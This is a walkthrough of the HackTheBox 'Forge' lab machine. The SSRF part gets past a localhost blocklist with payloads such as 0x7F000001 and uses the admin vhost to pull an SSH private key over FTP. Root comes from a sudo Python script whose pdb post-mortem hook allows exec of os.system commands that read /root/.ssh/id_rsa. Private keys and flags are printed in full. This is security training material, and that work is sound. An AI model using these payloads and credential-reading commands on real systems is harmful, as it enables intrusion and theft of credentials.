# Forge - HackTheBox - Writeup
Linux, 30 Base Points, Medium

## Machine

![‏‏Forge.JPG](images/Forge.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```21```, ```22``` and ```80```.

***User***: By using [Upload an Image](http://forge.htb/upload) page we can use [SSRF attack](https://portswigger.net/web-security/ssrf) from the URL [http://admin.Forge.htb](http://admin.Forge.htb), From this URL we found an HTML which contains credentials to ```FTP``` and another ```/upload``` page which support also ```ftp```, Using [http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@admin.Forge.htb:21/.ssh/id_rsa](http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@admin.Forge.htb:21/.ssh/id_rsa) URL we get the ```user``` private key.

***Root***: By running ```sudo -l``` we found that we can run ```/opt/remote-manage.py``` as root, By reading the script we can see that we can triggr the python script to run [pdb](https://web.stanford.edu/class/physics91si/2013/handouts/Pdb_Commands.pdf), Using ```pdb``` we can use ```exec``` to run python commands aas root, using ```exec("import os; os.system('cat /root.ssh/id_rsa')")``` we get the ```root``` private key.

![pwn.JPG](images/pwn.JPG)


## Forge Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ nmap -sV -sC -oA nmap/Forge 10.10.11.111
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-20 01:28 IDT
Nmap scan report for 10.10.11.111
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

By observing port 80 we get the following web page (Redirected to [http://forge.htb/](http://forge.htb/)):

![port80.JPG](images/port80.JPG)

By clicking of [Upload an Image](http://forge.htb/upload) we get the following:

![upload.JPG](images/upload.JPG)

Using this page, we can upload an image from a local file or a URL.

We can try [SSRF](https://portswigger.net/web-security/ssrf) attack by sending a link to local files on a server.

If we are trying to send the following link [http://localhost](http://localhost) or [http://forge.htb](http://forge.htb) we can see those domains are on the server blacklist:

![localhost.JPG](images/localhost.JPG)

We can bypass it by sending [http://0x7F000001/](http://0x7F000001/) which ```0x7F000001``` is ```127.0.0.1``` OR [http://FoRge.htb](http://FoRge.htb):

![bypass.JPG](images/bypass.JPG)

But as we can see, It still does not help us so much.

By running ```gobuster vhosts``` we found the following ```vhost```:
```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ gobuster vhost -u http://forge.htb -w subdomains-top1milion.txt -t 100
....
Found: admin.forge.htb (Status: 200) [Size: 27]

```

If we are trying to browse it (add it do ```/etc/hosts``` before) we get:

![admin.JPG](images/admin.JPG)

Let's try to access this URL from the uploads page:

![adminreq.JPG](images/adminreq.JPG)

By accessing the URL [http://Forge.htb/uploads/aN2YSNqCT2CZe48VbDWy](http://Forge.htb/uploads/aN2YSNqCT2CZe48VbDWy) using Burp repeater we get the following:

![repeater1.JPG](images/repeater1.JPG)

```HTML
HTTP/1.1 200 OK
Date: Wed, 22 Sep 2021 20:02:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Disposition: inline; filename=aN2YSNqCT2CZe48VbDWy
Content-Length: 559
Last-Modified: Wed, 22 Sep 2021 20:02:00 GMT
Cache-Control: no-cache
Connection: close
Content-Type: image/jpg


<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

We found there two URL's [http://admin.Forge.htb/announcements](http://admin.Forget.htb/announcements) and [http://admin.Forge.htb/upload](http://admin.Forge.htb/upload).

Let's try to access them using the same way, First access to http://admin.Forge.htb/announcements](http://admin.Forget.htb/announcements):

![announcements.JPG](images/announcements.JPG)

And we got the following HTML:
```HTML
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

So following the notes we get credentials to ```FTP``` service: ```user:heightofsecurity123!```, And we can read also about the ```/upload``` page.

Now, Let's try to access to http://admin.Forge.htb/upload](http://admin.Forget.htb/upload):

![uploadpage.JPG](images/uploadpage.JPG)

Now, we get the following HTML:
```HTML
<!DOCTYPE html>
<html>
<head>
    <title>Upload an image</title>
</head>
<body onload="show_upload_local_file()">
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/upload.css">
    <script type="text/javascript" src="/static/js/main.js"></script>
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <center>
        <br><br>
        <div id="content">
            <h2 onclick="show_upload_local_file()">
                Upload local file
            </h2>
            <h2 onclick="show_upload_remote_file()">
                Upload from url
            </h2>
            <div id="form-div">
                
            </div>
        </div>
    </center>
    <br>
    <br>
</body>
</html>
```

Let's try to enumerate the FTP service using ```/upload``` URL as follow: [http://admin.Forge.htb/upload?u=&lt;url&gt;](http://admin.forge.htb/upload?u=&lt;url&gt;) as described.

Trying with ```FTP```: [http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@admin.Forge.htb:21/](http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@admin.Forge.htb:21/):

![ftp1.JPG](images/ftp1.JPG)

And we get the following files as a response:

![ftpresp.JPG](images/ftpresp.JPG)

So we are in ```/home``` directory, So by accessing the following URL:[http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@admin.Forge.htb:21/.ssh/id_rsa](http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@admin.Forge.htb:21/.ssh/id_rsa) we can get the user ```SSH``` private key:

![sshprivatekey.JPG](images/sshprivatekey.JPG)

Let's save as it ```id_rsa```:
```console
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

We know those credentials related to ```user```, So let's log in as ```user``` using this ```SSH``` private key:
```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ ssh -i id_rsa user@forge.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Sep 2021 08:28:35 PM UTC

  System load:           0.0
  Usage of /:            47.9% of 6.82GB
  Memory usage:          38%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.111
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3ea5


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$ cat user.txt
b51c3bf5a311d2e2ee3e7aee6c2c1d3b
user@forge:~$ 
```

And we get the user flag ```b51c3bf5a311d2e2ee3e7aee6c2c1d3b```.


### Root

By running ```sudo -l``` we get the following:
```console
user@forge:/var/www/admin$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Let's observe this python script:
```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()

```

Let's run this script:
```console
user@forge:/var/www$ sudo python3 /opt/remote-manage.py
Listening on localhost:38013

```

Next, Let's create ```SSH``` tunnel to access it using our host:
```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ ssh -N -L 38013:127.0.0.1:38013 -i id_rsa user@forge.htb

```

And now we can access it from our host:
```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ nc 127.0.0.1 38013
Enter the secret passsword: 
```

From the python script we can get the password:
```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ nc 127.0.0.1 38013
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

On the python script we can see the following lines:
```python
...
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
...
```

The python script exception handle is to run [pdb](https://web.stanford.edu/class/physics91si/2013/handouts/Pdb_Commands.pdf).
Let's try to send any character, i.e ```X```` to get an exception and to trigger the application to run ```pdb```:
```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ nc 127.0.0.1 38013
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
X
```

And we triggered the script:
```python
user@forge:/var/www$ sudo python3 /opt/remote-manage.py
Listening on localhost:38013
invalid literal for int() with base 10: b'X'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) help

Documented commands (type help <topic>):
========================================
EOF    c          d        h         list      q        rv       undisplay
a      cl         debug    help      ll        quit     s        unt      
alias  clear      disable  ignore    longlist  r        source   until    
args   commands   display  interact  n         restart  step     up       
b      condition  down     j         next      return   tbreak   w        
break  cont       enable   jump      p         retval   u        whatis   
bt     continue   exit     l         pp        run      unalias  where    

Miscellaneous help topics:
==========================
exec  pdb

(Pdb) 
```

We can run python commands using ```exec``` command as follows:
```python
(Pdb) exec("import os;os.system('whoami')")
root
```

As we can see, we are ```root```, Let's get the root ```SSH``` private key:
```python
(Pdb) exec("import os;os.system('cat /root/.ssh/id_rsa')")
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAusTE7uvvBLrfqDLv6I/+Xc9W/RVGA4eFPOowUNkHDZ4MTUm4cK4/
DdTvY7o7bvSinEX26rWdG4eVY3qnBGSACl3VIGX80NsWgyZwWQT20Vj0q8gf674RB4LfB6
i6Awm8cbm3105HxfQnqr4qr2oJEpyDVaF29zpaS+6y0Ogq7HcRkSyQyErBnGmlOYBcBvvh
M+/j0iCCMfM6ZbZ/0ouoN4uOXzn+jh/ZJstDoEd0VH4RhnMzHA1hdo+6+OhFUbtoCFdxtP
wfzVp0LQb2wqitREeT5GNPIVL2//tbNz+QUfuwQAEHCcveyKWDVTs/klDkcf/p9NqsAspn
re6QhoLqzsuAXds0gThQLN+/+EUuV3sZ6wdkmHBqKbm8aaGc84P/SpnDvz249+G188NoUq
nVSb9RCRnGy/JStP97umzhbyJLiRpRY8Dlh8Ugln6D58b5QVk3uYjP0muf+SI3No+L7+81
iM7jNo9x2Jsg79tjP/RfgSJdTt6atSgeq9BwBJzxAAAFgPqA8Wj6gPFoAAAAB3NzaC1yc2
EAAAGBALrExO7r7wS636gy7+iP/l3PVv0VRgOHhTzqMFDZBw2eDE1JuHCuPw3U72O6O270
opxF9uq1nRuHlWN6pwRkgApd1SBl/NDbFoMmcFkE9tFY9KvIH+u+EQeC3weougMJvHG5t9
dOR8X0J6q+Kq9qCRKcg1Whdvc6WkvustDoKux3EZEskMhKwZxppTmAXAb74TPv49IggjHz
OmW2f9KLqDeLjl85/o4f2SbLQ6BHdFR+EYZzMxwNYXaPuvjoRVG7aAhXcbT8H81adC0G9s
KorURHk+RjTyFS9v/7Wzc/kFH7sEABBwnL3silg1U7P5JQ5HH/6fTarALKZ63ukIaC6s7L
gF3bNIE4UCzfv/hFLld7GesHZJhwaim5vGmhnPOD/0qZw789uPfhtfPDaFKp1Um/UQkZxs
vyUrT/e7ps4W8iS4kaUWPA5YfFIJZ+g+fG+UFZN7mIz9Jrn/kiNzaPi+/vNYjO4zaPcdib
IO/bYz/0X4EiXU7emrUoHqvQcASc8QAAAAMBAAEAAAGAR6rR1sx5/1qmECjbnmYCuYSiYK
MVJq2OFv3WZG+jITqQhefP+o0ibPBUm/QOclk1PLosMYxXKQUx8eZSyIC4EUJIUhJQnOQ1
E0ZgvggFnfeAi5pThWZ9qmAxrQK1vgyyXwFg5iGHsRIrVn16a61Ipfeg/e7jc6LUm2aQ/1
DXh7145DgxpmnpOVfgqtvydEua8w8OYMdQrlIjCnypN+WXOxk2HJxobakS7qv42zwQC4wE
tY7nAdCwoYotuO2IDADZFcRWiPImmTnVWQvM27VKzpuDmp1kmOh8VD1qFV0GlPQIsJMHLH
rQYJ6toBi7WaHC7H56EDd9QrVJgmmj50I90weAj8fldN+L8VSl3PKBgzdsxUH9xB3toj1z
uYvgk7cPxcW78ObYUkmNUJNMZcA0/LezoXG7fWuhRoOf1eXIbUKYd+ygNlyxaqywufESzY
HaGezUEV+UsI0Ll3Me7WyslZaX6hpOjhYJmN3kv0dWNJg9Nkg29Pr4iU5q+t71BYlxAAAA
wFWKwWX2ApTatPB/5GvAs3SWT+O3bj3FXoQ3VjI5D+vPyUCx9Dr/iMOBv5YHObfxwqezzD
0m82Zy1gwvWUPpVq4uiRPwwojqAYqDwA/gbX3+LdVR0bZFMFx2R0FzVXEIMCI5Cxvg+DBx
NsLIQ8EbEWGp9NWOa9FeRsA8o/KjzFEPU8MlxxgaFkzsxciykNGZk1luUSsNujm7fgWv55
ZdFmti8b1TAt5cVkHrT5Fks835XX9W8exqcOcZlEHIXOSgLQAAAMEA9cceY3X6o9Nu6xPu
3eREkMAjIaR+cY/OrKO40Zm0NiIvpi+kOVoNtau0gXSXNryMyuGsjGuWW8IPnpr21UBJP8
1O4kfqXdsfj067n21kofcxS4Ca6cSi7m4HU6ZGGpiC9eSJ44XRNGypKhahpxhbZqgFFdVU
MdzdsZRFhm1tdQU8ZoqouPAX+tI3788IBG2QAgTpQ9ly7sVKMdwfT9qC3wtcgXGS1OweaC
BUDvWd2rzP7/egeGqGWFOYZFxKhndPAAAAwQDCiVwE7LiHyZHfHN7amzdusL9odhljHkYf
2xeZP3PERvqWr3g8xwhgT4oGUy8x3zgILYYvnX04FpfpBMke725nEyrvK/kZf/Sgp7Sk0h
pbEabGDypeS4A3UIhtaM+VShS7wJGz8sXAbMm+JSwMt67vN95IULw6+SuyirRLUDc77N76
xIK6PSiF7Hs2Z7BZOVQd1BpblnZrL3mbJcdvXS8n55QgDuxfJeoxKrr9r1r/WqRjtce8/A
ZPz43Mi1EOl78AAAAKcm9vdEBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
(Pdb)
```

Now, We can save and use the root ```SSH``` private key:
```console
┌─[evyatar@parrot]─[/hackthebox/Forge]
└──╼ $ ssh -i id_root root@forge.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Sep 2021 08:51:52 PM UTC

  System load:           0.0
  Usage of /:            47.9% of 6.82GB
  Memory usage:          49%
  Swap usage:            0%
  Processes:             230
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.111
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3ea5


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep  7 17:07:50 2021
root@forge:~# cat root.txt
78fe1efd1096dc5b6e443747ccfe6d74
root@forge:~# 
```

And we get the root flag ```78fe1efd1096dc5b6e443747ccfe6d74```.